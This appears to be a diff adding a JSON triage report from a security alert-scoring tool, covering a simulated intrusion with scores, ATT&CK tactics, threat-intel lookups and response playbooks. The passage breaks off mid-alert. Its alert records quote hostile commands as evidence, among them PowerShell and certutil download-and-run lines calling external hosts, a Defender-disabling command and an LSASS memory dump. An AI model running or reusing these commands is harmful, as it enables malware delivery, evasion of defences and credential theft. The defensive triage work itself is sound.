@@ -1,0 +1,1506 @@
+{
+  "meta": {
+    "generated": "2026-08-23 14:39:31",
+    "version": "1.0.0",
+    "input": "samples\\findings.json",
+    "finding_count": 18,
+    "enrichment": "offline snapshot (no network, no API keys)  [verdicts from: offline-snapshot (AbuseIPDB-shaped) x8, offline-snapshot (VirusTotal-shaped) x2]",
+    "lookups": 10,
+    "cache_hits": 4,
+    "min_band": "Informational"
+  },
+  "cases": [
+    {
+      "account": "CORP\\jdoe",
+      "account_type": "standard",
+      "hosts": [
+        "VPN-GW-01",
+        "WKSTN-0412"
+      ],
+      "origins": {
+        "198.51.100.30": {
+          "scope": "external",
+          "verdict": "suspicious"
+        }
+      },
+      "score": 100,
+      "band": "Critical",
+      "queue": "Tier 2 / Incident Response",
+      "alert_count": 11,
+      "tactics": [
+        "Initial Access",
+        "Execution",
+        "Persistence",
+        "Defense Evasion",
+        "Credential Access",
+        "Discovery",
+        "Command and Control"
+      ],
+      "first_seen": "2026-08-20 03:12:04",
+      "last_seen": "2026-08-20 09:48:31",
+      "bad_indicators": {
+        "198.51.100.30": "suspicious",
+        "cdn-update.xyz": "malicious",
+        "203.0.113.233": "malicious",
+        "7446d75f3dfee276699f5abbdd774098006130e6576ab85fde1d44f58455214e": "malicious"
+      },
+      "summary": "11 alert(s) on CORP\\jdoe, on VPN-GW-01, WKSTN-0412, driven from outside the network via 198.51.100.30, spanning Initial Access -> Execution -> Persistence -> Defense Evasion -> Credential Access -> Discovery -> Command and Control, touching known-bad 203.0.113.233, 7446d75f3dfee276699f5abbdd774098006130e6576ab85fde1d44f58455214e, cdn-update.xyz.",
+      "alert_ids": [
+        "ALRT-0001",
+        "ALRT-0004",
+        "ALRT-0005",
+        "ALRT-0006",
+        "ALRT-0007",
+        "ALRT-0008",
+        "ALRT-0009",
+        "ALRT-0010",
+        "ALRT-0011",
+        "ALRT-0012",
+        "ALRT-0013"
+      ]
+    },
+    {
+      "account": "CORP\\mkaya",
+      "account_type": "standard",
+      "hosts": [
+        "VPN-GW-01",
+        "SRV-FILE-02"
+      ],
+      "origins": {
+        "198.51.100.30": {
+          "scope": "external",
+          "verdict": "suspicious"
+        },
+        "10.20.7.41": {
+          "scope": "internal",
+          "verdict": "internal"
+        }
+      },
+      "score": 78,
+      "band": "High",
+      "queue": "Tier 2",
+      "alert_count": 2,
+      "tactics": [
+        "Credential Access",
+        "Lateral Movement"
+      ],
+      "first_seen": "2026-08-20 03:12:19",
+      "last_seen": "2026-08-20 09:50:12",
+      "bad_indicators": {
+        "198.51.100.30": "suspicious"
+      },
+      "summary": "2 alert(s) on CORP\\mkaya, on VPN-GW-01, SRV-FILE-02, driven from outside the network via 198.51.100.30, spanning Credential Access -> Lateral Movement.",
+      "alert_ids": [
+        "ALRT-0002",
+        "ALRT-0014"
+      ]
+    },
+    {
+      "account": "CORP\\ademir",
+      "account_type": "standard",
+      "hosts": [
+        "VPN-GW-01"
+      ],
+      "origins": {
+        "198.51.100.30": {
+          "scope": "external",
+          "verdict": "suspicious"
+        }
+      },
+      "score": 78,
+      "band": "High",
+      "queue": "Tier 2",
+      "alert_count": 1,
+      "tactics": [
+        "Credential Access"
+      ],
+      "first_seen": "2026-08-20 03:12:41",
+      "last_seen": "2026-08-20 03:12:41",
+      "bad_indicators": {
+        "198.51.100.30": "suspicious"
+      },
+      "summary": "1 alert(s) on CORP\\ademir, on VPN-GW-01, driven from outside the network via 198.51.100.30, spanning Credential Access.",
+      "alert_ids": [
+        "ALRT-0003"
+      ]
+    },
+    {
+      "account": "CORP\\svc_backup",
+      "account_type": "service",
+      "hosts": [
+        "SRV-BKP-01"
+      ],
+      "origins": {},
+      "score": 60,
+      "band": "Medium",
+      "queue": "Tier 1",
+      "alert_count": 2,
+      "tactics": [
+        "Persistence",
+        "Defense Evasion"
+      ],
+      "first_seen": "2026-08-20 02:17:44",
+      "last_seen": "2026-08-20 02:19:03",
+      "bad_indicators": {},
+      "summary": "2 alert(s) on CORP\\svc_backup, on SRV-BKP-01, spanning Persistence -> Defense Evasion.",
+      "alert_ids": [
+        "ALRT-0015",
+        "ALRT-0016"
+      ]
+    },
+    {
+      "account": "CORP\\admin_bt",
+      "account_type": "privileged",
+      "hosts": [
+        "WKSTN-0331"
+      ],
+      "origins": {},
+      "score": 43,
+      "band": "Medium",
+      "queue": "Tier 1",
+      "alert_count": 2,
+      "tactics": [
+        "Execution",
+        "Defense Evasion"
+      ],
+      "first_seen": "2026-08-20 14:02:11",
+      "last_seen": "2026-08-20 14:05:47",
+      "bad_indicators": {},
+      "summary": "2 alert(s) on CORP\\admin_bt, on WKSTN-0331, spanning Execution -> Defense Evasion.",
+      "alert_ids": [
+        "ALRT-0017",
+        "ALRT-0018"
+      ]
+    }
+  ],
+  "alerts": [
+    {
+      "id": "ALRT-0001",
+      "score": 100,
+      "raw_score": 124,
+      "band": "Critical",
+      "queue": "Tier 2 / Incident Response",
+      "sla_minutes": 15,
+      "time": "2026-08-20T03:12:04",
+      "user": "CORP\\jdoe",
+      "account_type": "standard",
+      "host": "VPN-GW-01",
+      "source_ip": "198.51.100.30",
+      "source_scope": "external",
+      "source_verdict": "suspicious",
+      "logon_type": "3",
+      "rule_id": "AUTH-FAILED-BURST",
+      "rule": "Repeated failed logons for a single account",
+      "severity": "Low",
+      "attack": "T1110.003",
+      "tactics": [
+        "Credential Access"
+      ],
+      "primary_tactic": "Credential Access",
+      "command_line": "",
+      "decoded": [],
+      "why": "Several failed authentication attempts for one account in quick succession. Individually weak evidence - users mistype passwords - but the pattern matters when it repeats across accounts.",
+      "intel_verdict": "suspicious",
+      "indicators": [
+        {
+          "type": "ip",
+          "value": "198.51.100.30",
+          "role": "source",
+          "via_decode": false,
+          "scope": "external",
+          "verdict": "suspicious",
+          "confidence": 41,
+          "provider": "offline-snapshot (AbuseIPDB-shaped)",
+          "note": "Low-confidence abuse reports, mostly authentication brute-force. Not conclusive on its own - the shared-origin correlation is what makes it matter here."
+        }
+      ],
+      "score_breakdown": [
+        {
+          "label": "Detection severity: Low",
+          "points": 10,
+          "reason": "starting weight assigned by the detection rule that fired"
+        },
+        {
+          "label": "Threat intel: 198.51.100.30 (source) = suspicious",
+          "points": 20,
+          "reason": "indicator has partial / low-confidence detections"
+        },
+        {
+          "label": "Context: 03:12 is outside business hours",
+          "points": 10,
+          "reason": "activity occurred outside configured business hours"
+        },
+        {
+          "label": "Context: session originated externally from 198.51.100.30",
+          "points": 18,
+          "reason": "the session originated from a routable external address rather than the console of the affected host - someone drove this from outside the network"
+        },
+        {
+          "label": "Correlation: 7 ATT&CK tactics on this account",
+          "points": 24,
+          "reason": "this account's alerts span multiple consecutive ATT&CK tactics, suggesting a progressing intrusion rather than an isolated event (Initial Access -> Execution -> Persistence -> Defense Evasion -> Credential Access -> Discovery -> Command and Control)"
+        },
+        {
+          "label": "Correlation: repeated detection (RECON-BURST x3)",
+          "points": 10,
+          "reason": "the same detection fired repeatedly for this account"
+        },
+        {
+          "label": "Correlation: 10 alerts within 10 minutes",
+          "points": 12,
+          "reason": "many alerts for this account landed inside a short window"
+        },
+        {
+          "label": "Correlation: origin 198.51.100.30 touched 3 accounts within 30 minutes (ademir, jdoe, mkaya)",
+          "points": 20,
+          "reason": "one origin address touched several different accounts in a short window - the signature of password spraying, credential stuffing, or one stolen credential being reused across the network. Grouping alerts by account cannot see this: each account shows only a single unremarkable alert"
+        }
+      ],
+      "recommended_action": "Recommend containment now: isolate the host and disable the account pending review.",
+      "playbook": [
+        "Establish which credentials are actually implicated: a dumped secret store, or accounts targeted by repeated authentication attempts.",
+        "If a credential store or memory dump is involved, treat every credential used on this host as exposed and force a password reset for the affected account and any cached domain accounts.",
+        "If the evidence is failed authentication, check lockout policy and look for any attempt from the same origin that succeeded.",
+        "Pull the authentication trail for the affected accounts and the originating address across the alert window.",
+        "Confirm the parent process chain or the session context, whichever the telemetry carries.",
+        "Check whether a change ticket or deployment window explains this activity.",
+        "Record the verdict on the alert so the rule can be tuned."
+      ]
+    },
+    {
+      "id": "ALRT-0004",
+      "score": 100,
+      "raw_score": 144,
+      "band": "Critical",
+      "queue": "Tier 2 / Incident Response",
+      "sla_minutes": 15,
+      "time": "2026-08-20T09:41:12",
+      "user": "CORP\\jdoe",
+      "account_type": "standard",
+      "host": "WKSTN-0412",
+      "source_ip": null,
+      "source_scope": null,
+      "source_verdict": null,
+      "logon_type": null,
+      "rule_id": "OFFICE-SPAWN-SHELL",
+      "rule": "Office process spawned a shell",
+      "severity": "High",
+      "attack": "T1566 / T1059",
+      "tactics": [
+        "Initial Access",
+        "Execution"
+      ],
+      "primary_tactic": "Execution",
+      "command_line": "cmd.exe /c powershell -w hidden -nop -c \"iwr https://cdn-update.xyz/inv/stage1.ps1 -UseBasicParsing | iex\"",
+      "decoded": [],
+      "why": "A Microsoft Office application launched a command interpreter, the classic macro-lure execution chain.",
+      "intel_verdict": "malicious",
+      "indicators": [
+        {
+          "type": "url",
+          "value": "https://cdn-update.xyz/inv/stage1.ps1",
+          "role": "destination",
+          "via_decode": false,
+          "scope": null,
+          "verdict": "unknown",
+          "confidence": 0,
+          "provider": "n/a",
+          "note": "URL kept as context; its host is enriched separately"
+        },
+        {
+          "type": "domain",
+          "value": "cdn-update.xyz",
+          "role": "destination",
+          "via_decode": false,
+          "scope": "external",
+          "verdict": "malicious",
+          "confidence": 88,
+          "provider": "offline-snapshot (VirusTotal-shaped)",
+          "note": "Registered 9 days before the alert. Typosquat-style CDN name on a low-cost TLD."
+        }
+      ],
+      "score_breakdown": [
+        {
+          "label": "Detection severity: High",
+          "points": 50,
+          "reason": "starting weight assigned by the detection rule that fired"
+        },
+        {
+          "label": "Threat intel: cdn-update.xyz (destination) = malicious",
+          "points": 40,
+          "reason": "indicator is known-bad in threat intelligence"
+        },
+        {
+          "label": "Context: external destination referenced",
+          "points": 8,
+          "reason": "the command line references a routable external address"
+        },
+        {
+          "label": "Correlation: 7 ATT&CK tactics on this account",
+          "points": 24,
+          "reason": "this account's alerts span multiple consecutive ATT&CK tactics, suggesting a progressing intrusion rather than an isolated event (Initial Access -> Execution -> Persistence -> Defense Evasion -> Credential Access -> Discovery -> Command and Control)"
+        },
+        {
+          "label": "Correlation: repeated detection (RECON-BURST x3)",
+          "points": 10,
+          "reason": "the same detection fired repeatedly for this account"
+        },
+        {
+          "label": "Correlation: 10 alerts within 10 minutes",
+          "points": 12,
+          "reason": "many alerts for this account landed inside a short window"
+        }
+      ],
+      "recommended_action": "Recommend containment now: isolate the host and disable the account pending review.",
+      "playbook": [
+        "Decode and read the actual command before judging intent.",
+        "Determine whether the interpreter run is user-initiated or spawned by another process.",
+        "Confirm the parent process chain or the session context, whichever the telemetry carries.",
+        "Check whether a change ticket or deployment window explains this activity.",
+        "Record the verdict on the alert so the rule can be tuned."
+      ]
+    },
+    {
+      "id": "ALRT-0005",
+      "score": 100,
+      "raw_score": 144,
+      "band": "Critical",
+      "queue": "Tier 2 / Incident Response",
+      "sla_minutes": 15,
+      "time": "2026-08-20T09:41:58",
+      "user": "CORP\\jdoe",
+      "account_type": "standard",
+      "host": "WKSTN-0412",
+      "source_ip": null,
+      "source_scope": null,
+      "source_verdict": null,
+      "logon_type": null,
+      "rule_id": "PS-ENCODED",
+      "rule": "Encoded PowerShell command",
+      "severity": "High",
+      "attack": "T1059.001 / T1027",
+      "tactics": [
+        "Execution",
+        "Defense Evasion"
+      ],
+      "primary_tactic": "Defense Evasion",
+      "command_line": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgAyADMAMwAvAGIAZQBhAGMAbwBuAC4AcABzADEAJwApAA==",
+      "decoded": [
+        "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.233/beacon.ps1')"
+      ],
+      "why": "PowerShell was launched with a Base64-encoded command, a very common obfuscation and execution technique used to hide intent from log review.",
+      "intel_verdict": "malicious",
+      "indicators": [
+        {
+          "type": "url",
+          "value": "http://203.0.113.233/beacon.ps1",
+          "role": "destination",
+          "via_decode": true,
+          "scope": null,
+          "verdict": "unknown",
+          "confidence": 0,
+          "provider": "n/a",
+          "note": "URL kept as context; its host is enriched separately"
+        },
+        {
+          "type": "ip",
+          "value": "203.0.113.233",
+          "role": "destination",
+          "via_decode": true,
+          "scope": "external",
+          "verdict": "malicious",
+          "confidence": 97,
+          "provider": "offline-snapshot (AbuseIPDB-shaped)",
+          "note": "Reported repeatedly as a commodity-loader C2 node."
+        }
+      ],
+      "score_breakdown": [
+        {
+          "label": "Detection severity: High",
+          "points": 50,
+          "reason": "starting weight assigned by the detection rule that fired"
+        },
+        {
+          "label": "Threat intel: 203.0.113.233 (destination) = malicious",
+          "points": 40,
+          "reason": "indicator is known-bad in threat intelligence (recovered only after decoding the payload)"
+        },
+        {
+          "label": "Context: external destination referenced",
+          "points": 8,
+          "reason": "the command line references a routable external address"
+        },
+        {
+          "label": "Correlation: 7 ATT&CK tactics on this account",
+          "points": 24,
+          "reason": "this account's alerts span multiple consecutive ATT&CK tactics, suggesting a progressing intrusion rather than an isolated event (Initial Access -> Execution -> Persistence -> Defense Evasion -> Credential Access -> Discovery -> Command and Control)"
+        },
+        {
+          "label": "Correlation: repeated detection (RECON-BURST x3)",
+          "points": 10,
+          "reason": "the same detection fired repeatedly for this account"
+        },
+        {
+          "label": "Correlation: 10 alerts within 10 minutes",
+          "points": 12,
+          "reason": "many alerts for this account landed inside a short window"
+        }
+      ],
+      "recommended_action": "Recommend containment now: isolate the host and disable the account pending review.",
+      "playbook": [
+        "Verify endpoint protection is still enabled and reporting.",
+        "Review any exclusion paths that were added and remove unapproved ones.",
+        "Assume telemetry gaps for the period after the tampering.",
+        "Confirm the parent process chain or the session context, whichever the telemetry carries.",
+        "Check whether a change ticket or deployment window explains this activity.",
+        "Record the verdict on the alert so the rule can be tuned."
+      ]
+    },
+    {
+      "id": "ALRT-0006",
+      "score": 100,
+      "raw_score": 144,
+      "band": "Critical",
+      "queue": "Tier 2 / Incident Response",
+      "sla_minutes": 15,
+      "time": "2026-08-20T09:42:31",
+      "user": "CORP\\jdoe",
+      "account_type": "standard",
+      "host": "WKSTN-0412",
+      "source_ip": null,
+      "source_scope": null,
+      "source_verdict": null,
+      "logon_type": null,
+      "rule_id": "PS-DOWNLOAD-CRADLE",
+      "rule": "PowerShell download cradle",
+      "severity": "High",
+      "attack": "T1105 / T1059.001",
+      "tactics": [
+        "Execution",
+        "Command and Control"
+      ],
+      "primary_tactic": "Command and Control",
+      "command_line": "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.233/beacon.ps1')",
+      "decoded": [],
+      "why": "A remote payload is downloaded and piped straight into execution (download-and-run), a hallmark of staged malware delivery.",
+      "intel_verdict": "malicious",
+      "indicators": [
+        {
+          "type": "url",
+          "value": "http://203.0.113.233/beacon.ps1",
+          "role": "destination",
+          "via_decode": false,
+          "scope": null,
+          "verdict": "unknown",
+          "confidence": 0,
+          "provider": "n/a",
+          "note": "URL kept as context; its host is enriched separately"
+        },
+        {
+          "type": "ip",
+          "value": "203.0.113.233",
+          "role": "destination",
+          "via_decode": false,
+          "scope": "external",
+          "verdict": "malicious",
+          "confidence": 97,
+          "provider": "offline-snapshot (AbuseIPDB-shaped)",
+          "note": "Reported repeatedly as a commodity-loader C2 node."
+        }
+      ],
+      "score_breakdown": [
+        {
+          "label": "Detection severity: High",
+          "points": 50,
+          "reason": "starting weight assigned by the detection rule that fired"
+        },
+        {
+          "label": "Threat intel: 203.0.113.233 (destination) = malicious",
+          "points": 40,
+          "reason": "indicator is known-bad in threat intelligence"
+        },
+        {
+          "label": "Context: external destination referenced",
+          "points": 8,
+          "reason": "the command line references a routable external address"
+        },
+        {
+          "label": "Correlation: 7 ATT&CK tactics on this account",
+          "points": 24,
+          "reason": "this account's alerts span multiple consecutive ATT&CK tactics, suggesting a progressing intrusion rather than an isolated event (Initial Access -> Execution -> Persistence -> Defense Evasion -> Credential Access -> Discovery -> Command and Control)"
+        },
+        {
+          "label": "Correlation: repeated detection (RECON-BURST x3)",
+          "points": 10,
+          "reason": "the same detection fired repeatedly for this account"
+        },
+        {
+          "label": "Correlation: 10 alerts within 10 minutes",
+          "points": 12,
+          "reason": "many alerts for this account landed inside a short window"
+        }
+      ],
+      "recommended_action": "Recommend containment now: isolate the host and disable the account pending review.",
+      "playbook": [
+        "Block the external indicator at the egress proxy / firewall.",
+        "Pull full network flow for this host over the alert window.",
+        "Check whether other hosts contacted the same indicator.",
+        "Confirm the parent process chain or the session context, whichever the telemetry carries.",
+        "Check whether a change ticket or deployment window explains this activity.",
+        "Record the verdict on the alert so the rule can be tuned."
+      ]
+    },
+    {
+      "id": "ALRT-0008",
+      "score": 100,
+      "raw_score": 144,
+      "band": "Critical",
+      "queue": "Tier 2 / Incident Response",
+      "sla_minutes": 15,
+      "time": "2026-08-20T09:44:17",
+      "user": "CORP\\jdoe",
+      "account_type": "standard",
+      "host": "WKSTN-0412",
+      "source_ip": null,
+      "source_scope": null,
+      "source_verdict": null,
+      "logon_type": null,
+      "rule_id": "LOLBIN-CERTUTIL",
+      "rule": "certutil used as a downloader / decoder",
+      "severity": "High",
+      "attack": "T1105 / T1140",
+      "tactics": [
+        "Defense Evasion",
+        "Command and Control"
+      ],
+      "primary_tactic": "Command and Control",
+      "command_line": "certutil.exe -urlcache -split -f http://203.0.113.233/a.exe C:\\Users\\Public\\a.exe",
+      "decoded": [],
+      "why": "certutil is a signed Windows binary abused to download files or decode Base64 payloads, bypassing application controls (a 'living off the land' technique).",
+      "intel_verdict": "malicious",
+      "indicators": [
+        {
+          "type": "url",
+          "value": "http://203.0.113.233/a.exe",
+          "role": "destination",
+          "via_decode": false,
+          "scope": null,
+          "verdict": "unknown",
+          "confidence": 0,
+          "provider": "n/a",
+          "note": "URL kept as context; its host is enriched separately"
+        },
+        {
+          "type": "ip",
+          "value": "203.0.113.233",
+          "role": "destination",
+          "via_decode": false,
+          "scope": "external",
+          "verdict": "malicious",
+          "confidence": 97,
+          "provider": "offline-snapshot (AbuseIPDB-shaped)",
+          "note": "Reported repeatedly as a commodity-loader C2 node."
+        },
+        {
+          "type": "hash",
+          "value": "7446d75f3dfee276699f5abbdd774098006130e6576ab85fde1d44f58455214e",
+          "role": "destination",
+          "via_decode": false,
+          "scope": null,
+          "verdict": "malicious",
+          "confidence": 92,
+          "provider": "offline-snapshot (VirusTotal-shaped)",
+          "note": "Widely detected downloader stub."
+        }
+      ],
+      "score_breakdown": [
+        {
+          "label": "Detection severity: High",
+          "points": 50,
+          "reason": "starting weight assigned by the detection rule that fired"
+        },
+        {
+          "label": "Threat intel: 203.0.113.233 (destination) = malicious",
+          "points": 40,
+          "reason": "indicator is known-bad in threat intelligence"
+        },
+        {
+          "label": "Context: external destination referenced",
+          "points": 8,
+          "reason": "the command line references a routable external address"
+        },
+        {
+          "label": "Correlation: 7 ATT&CK tactics on this account",
+          "points": 24,
+          "reason": "this account's alerts span multiple consecutive ATT&CK tactics, suggesting a progressing intrusion rather than an isolated event (Initial Access -> Execution -> Persistence -> Defense Evasion -> Credential Access -> Discovery -> Command and Control)"
+        },
+        {
+          "label": "Correlation: repeated detection (RECON-BURST x3)",
+          "points": 10,
+          "reason": "the same detection fired repeatedly for this account"
+        },
+        {
+          "label": "Correlation: 10 alerts within 10 minutes",
+          "points": 12,
+          "reason": "many alerts for this account landed inside a short window"
+        }
+      ],
+      "recommended_action": "Recommend containment now: isolate the host and disable the account pending review.",
+      "playbook": [
+        "Block the external indicator at the egress proxy / firewall.",
+        "Pull full network flow for this host over the alert window.",
+        "Check whether other hosts contacted the same indicator.",
+        "Confirm the parent process chain or the session context, whichever the telemetry carries.",
+        "Check whether a change ticket or deployment window explains this activity.",
+        "Record the verdict on the alert so the rule can be tuned."
+      ]
+    },
+    {
+      "id": "ALRT-0007",
+      "score": 96,
+      "raw_score": 96,
+      "band": "Critical",
+      "queue": "Tier 2 / Incident Response",
+      "sla_minutes": 15,
+      "time": "2026-08-20T09:43:04",
+      "user": "CORP\\jdoe",
+      "account_type": "standard",
+      "host": "WKSTN-0412",
+      "source_ip": null,
+      "source_scope": null,
+      "source_verdict": null,
+      "logon_type": null,
+      "rule_id": "DEFENSE-AVTAMPER",
+      "rule": "Defender tampering",
+      "severity": "High",
+      "attack": "T1562.001",
+      "tactics": [
+        "Defense Evasion"
+      ],
+      "primary_tactic": "Defense Evasion",
+      "command_line": "Set-MpPreference -DisableRealtimeMonitoring $true; Add-MpPreference -ExclusionPath C:\\Users\\Public",
+      "decoded": [],
+      "why": "Windows Defender real-time protection is being disabled or given exclusions, a common step to blind the endpoint before further activity.",
+      "intel_verdict": "unknown",
+      "indicators": [],
+      "score_breakdown": [
+        {
+          "label": "Detection severity: High",
+          "points": 50,
+          "reason": "starting weight assigned by the detection rule that fired"
+        },
+        {
+          "label": "Correlation: 7 ATT&CK tactics on this account",
+          "points": 24,
+          "reason": "this account's alerts span multiple consecutive ATT&CK tactics, suggesting a progressing intrusion rather than an isolated event (Initial Access -> Execution -> Persistence -> Defense Evasion -> Credential Access -> Discovery -> Command and Control)"
+        },
+        {
+          "label": "Correlation: repeated detection (RECON-BURST x3)",
+          "points": 10,
+          "reason": "the same detection fired repeatedly for this account"
+        },
+        {
+          "label": "Correlation: 10 alerts within 10 minutes",
+          "points": 12,
+          "reason": "many alerts for this account landed inside a short window"
+        }
+      ],
+      "recommended_action": "Recommend containment now: isolate the host and disable the account pending review.",
+      "playbook": [
+        "Verify endpoint protection is still enabled and reporting.",
+        "Review any exclusion paths that were added and remove unapproved ones.",
+        "Assume telemetry gaps for the period after the tampering.",
+        "Confirm the parent process chain or the session context, whichever the telemetry carries.",
+        "Check whether a change ticket or deployment window explains this activity.",
+        "Record the verdict on the alert so the rule can be tuned."
+      ]
+    },
+    {
+      "id": "ALRT-0010",
+      "score": 96,
+      "raw_score": 96,
+      "band": "Critical",
+      "queue": "Tier 2 / Incident Response",
+      "sla_minutes": 15,
+      "time": "2026-08-20T09:47:55",
+      "user": "CORP\\jdoe",
+      "account_type": "standard",
+      "host": "WKSTN-0412",
+      "source_ip": null,
+      "source_scope": null,
+      "source_verdict": null,
+      "logon_type": null,
+      "rule_id": "CRED-DUMP",
+      "rule": "Credential-dumping indicators",
+      "severity": "High",
+      "attack": "T1003.001",
+      "tactics": [
+        "Credential Access"
+      ],
+      "primary_tactic": "Credential Access",
+      "command_line": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 704 C:\\Users\\Public\\lsass.dmp full",
+      "decoded": [],
+      "why": "LSASS memory is being dumped to disk, the standard first step of offline credential extraction.",
+      "intel_verdict": "unknown",
+      "indicators": [],
+      "score_breakdown": [
+        {
+          "label": "Detection severity: High",
+          "points": 50,
+          "reason": "starting weight assigned by the detection rule that fired"
+        },
+        {
+          "label": "Correlation: 7 ATT&CK tactics on this account",
+          "points": 24,
+          "reason": "this account's alerts span multiple consecutive ATT&CK tactics, suggesting a progressing intrusion rather than an isolated event (Initial Access -> Execution -> Persistence -> Defense Evasion -> Credential Access -> Discovery -> Command and Control)"
+        },
+        {
+          "label": "Correlation: repeated detection (RECON-BURST x3)",
+          "points": 10,
+          "reason": "the same detection fired repeatedly for this account"
+        },
+        {
+          "label": "Correlation: 10 alerts within 10 minutes",
+          "points": 12,
+          "reason": "many alerts for this account landed inside a short window"
+        }
+      ],
+      "recommended_action": "Recommend containment now: isolate the host and disable the account pending review.",
+      "playbook": [
+        "Establish which credentials are actually implicated: a dumped secret store, or accounts targeted by repeated authentication attempts.",
+        "If a credential store or memory dump is involved, treat every credential used on this host as exposed and force a password reset for the affected account and any cached domain accounts.",
+        "If the evidence is failed authentication, check lockout policy and look for any attempt from the same origin that succeeded.",
+        "Pull the authentication trail for the affected accounts and the originating address across the alert window.",
+        "Confirm the parent process chain or the session context, whichever the telemetry carries.",
+        "Check whether a change ticket or deployment window explains this activity.",
+        "Record the verdict on the alert so the rule can be tuned."
+      ]
+    },
+    {
+      "id": "ALRT-0002",
+      "score": 78,
+      "raw_score": 78,
+      "band": "High",
+      "queue": "Tier 2",
+      "sla_minutes": 60,
+      "time": "2026-08-20T03:12:19",
+      "user": "CORP\\mkaya",
+      "account_type": "standard",
+      "host": "VPN-GW-01",
+      "source_ip": "198.51.100.30",
+      "source_scope": "external",
+      "source_verdict": "suspicious",
+      "logon_type": "3",
+      "rule_id": "AUTH-FAILED-BURST",
+      "rule": "Repeated failed logons for a single account",
+      "severity": "Low",
+      "attack": "T1110.003",
+      "tactics": [
+        "Credential Access"
+      ],
+      "primary_tactic": "Credential Access",
+      "command_line": "",
+      "decoded": [],
+      "why": "Several failed authentication attempts for one account in quick succession. Individually weak evidence - users mistype passwords - but the pattern matters when it repeats across accounts.",
+      "intel_verdict": "suspicious",
+      "indicators": [
+        {
+          "type": "ip",
+          "value": "198.51.100.30",
+          "role": "source",
+          "via_decode": false,
+          "scope": "external",
+          "verdict": "suspicious",
+          "confidence": 41,
+          "provider": "offline-snapshot (AbuseIPDB-shaped)",
+          "note": "Low-confidence abuse reports, mostly authentication brute-force. Not conclusive on its own - the shared-origin correlation is what makes it matter here."
+        }
+      ],
+      "score_breakdown": [
+        {
+          "label": "Detection severity: Low",
+          "points": 10,
+          "reason": "starting weight assigned by the detection rule that fired"
+        },
+        {
+          "label": "Threat intel: 198.51.100.30 (source) = suspicious",
+          "points": 20,
+          "reason": "indicator has partial / low-confidence detections"
+        },
+        {
+          "label": "Context: 03:12 is outside business hours",
+          "points": 10,
+          "reason": "activity occurred outside configured business hours"
+        },
+        {
+          "label": "Context: session originated externally from 198.51.100.30",
+          "points": 18,
+          "reason": "the session originated from a routable external address rather than the console of the affected host - someone drove this from outside the network"
+        },
+        {
+          "label": "Correlation: origin 198.51.100.30 touched 3 accounts within 30 minutes (ademir, jdoe, mkaya)",
+          "points": 20,
+          "reason": "one origin address touched several different accounts in a short window - the signature of password spraying, credential stuffing, or one stolen credential being reused across the network. Grouping alerts by account cannot see this: each account shows only a single unremarkable alert"
+        }
+      ],
+      "recommended_action": "Recommend analyst pickup within the SLA and a decision on containment.",
+      "playbook": [
+        "Establish which credentials are actually implicated: a dumped secret store, or accounts targeted by repeated authentication attempts.",
+        "If a credential store or memory dump is involved, treat every credential used on this host as exposed and force a password reset for the affected account and any cached domain accounts.",
+        "If the evidence is failed authentication, check lockout policy and look for any attempt from the same origin that succeeded.",
+        "Pull the authentication trail for the affected accounts and the originating address across the alert window.",
+        "Confirm the parent process chain or the session context, whichever the telemetry carries.",
+        "Check whether a change ticket or deployment window explains this activity.",
+        "Record the verdict on the alert so the rule can be tuned."
+      ]
+    },
+    {
+      "id": "ALRT-0003",
+      "score": 78,
+      "raw_score": 78,
+      "band": "High",
+      "queue": "Tier 2",
+      "sla_minutes": 60,
+      "time": "2026-08-20T03:12:41",
+      "user": "CORP\\ademir",
+      "account_type": "standard",
+      "host": "VPN-GW-01",
+      "source_ip": "198.51.100.30",
+      "source_scope": "external",
+      "source_verdict": "suspicious",
+      "logon_type": "3",
+      "rule_id": "AUTH-FAILED-BURST",
+      "rule": "Repeated failed logons for a single account",
+      "severity": "Low",
+      "attack": "T1110.003",
+      "tactics": [
+        "Credential Access"
+      ],
+      "primary_tactic": "Credential Access",
+      "command_line": "",
+      "decoded": [],
+      "why": "Several failed authentication attempts for one account in quick succession. Individually weak evidence - users mistype passwords - but the pattern matters when it repeats across accounts.",
+      "intel_verdict": "suspicious",
+      "indicators": [
+        {
+          "type": "ip",
+          "value": "198.51.100.30",
+          "role": "source",
+          "via_decode": false,
+          "scope": "external",
+          "verdict": "suspicious",
+          "confidence": 41,
+          "provider": "offline-snapshot (AbuseIPDB-shaped)",
+          "note": "Low-confidence abuse reports, mostly authentication brute-force. Not conclusive on its own - the shared-origin correlation is what makes it matter here."
+        }
+      ],
+      "score_breakdown": [
+        {
+          "label": "Detection severity: Low",
+          "points": 10,
+          "reason": "starting weight assigned by the detection rule that fired"
+        },
+        {
+          "label": "Threat intel: 198.51.100.30 (source) = suspicious",
+          "points": 20,
+          "reason": "indicator has partial / low-confidence detections"
+        },
+        {
+          "label": "Context: 03:12 is outside business hours",
+          "points": 10,
+          "reason": "activity occurred outside configured business hours"
+        },
+        {
+          "label": "Context: session originated externally from 198.51.100.30",
+          "points": 18,
+          "reason": "the session originated from a routable external address rather than the console of the affected host - someone drove this from outside the network"
+        },
+        {
+          "label": "Correlation: origin 198.51.100.30 touched 3 accounts within 30 minutes (ademir, jdoe, mkaya)",
+          "points": 20,
+          "reason": "one origin address touched several different accounts in a short window - the signature of password spraying, credential stuffing, or one stolen credential being reused across the network. Grouping alerts by account cannot see this: each account shows only a single unremarkable alert"
+        }
+      ],
+      "recommended_action": "Recommend analyst pickup within the SLA and a decision on containment.",
+      "playbook": [
+        "Establish which credentials are actually implicated: a dumped secret store, or accounts targeted by repeated authentication attempts.",
+        "If a credential store or memory dump is involved, treat every credential used on this host as exposed and force a password reset for the affected account and any cached domain accounts.",
+        "If the evidence is failed authentication, check lockout policy and look for any attempt from the same origin that succeeded.",
+        "Pull the authentication trail for the affected accounts and the originating address across the alert window.",
+        "Confirm the parent process chain or the session context, whichever the telemetry carries.",
+        "Check whether a change ticket or deployment window explains this activity.",
+        "Record the verdict on the alert so the rule can be tuned."
+      ]
+    },
+    {
+      "id": "ALRT-0009",
+      "score": 76,
+      "raw_score": 76,
+      "band": "High",
+      "queue": "Tier 2",
